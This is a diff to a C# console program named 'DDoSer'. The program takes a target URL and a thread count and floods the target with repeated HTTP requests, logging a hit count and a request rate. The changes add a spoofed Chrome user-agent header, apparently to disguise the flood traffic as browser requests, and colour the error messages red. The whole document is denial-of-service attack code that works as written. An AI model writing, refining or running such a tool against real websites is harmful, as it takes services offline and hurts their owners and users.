@@ -25,6 +25,7 @@ namespace DDoSer
 
             Console.Write("URL name of TARGET (Example https://www.google.com/): ");
             string url = Console.ReadLine();
+            string userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3";
 
             Console.Write("Workers count: ");
             int numOfThreads = Convert.ToInt32(Console.ReadLine());
@@ -46,13 +47,16 @@ namespace DDoSer
                         try
                         {
                             HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
+                            request.UserAgent = userAgent;
                             HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                             ++count;
                             Console.WriteLine($"Hitted: {count}\tSpeed: {speed}/sec");
                         }
                         catch (Exception e)
                         {
+                            Console.ForegroundColor = ConsoleColor.Red;
                             Console.WriteLine(e.Message);
+                            Console.ResetColor();
                         }
                     }
                 });
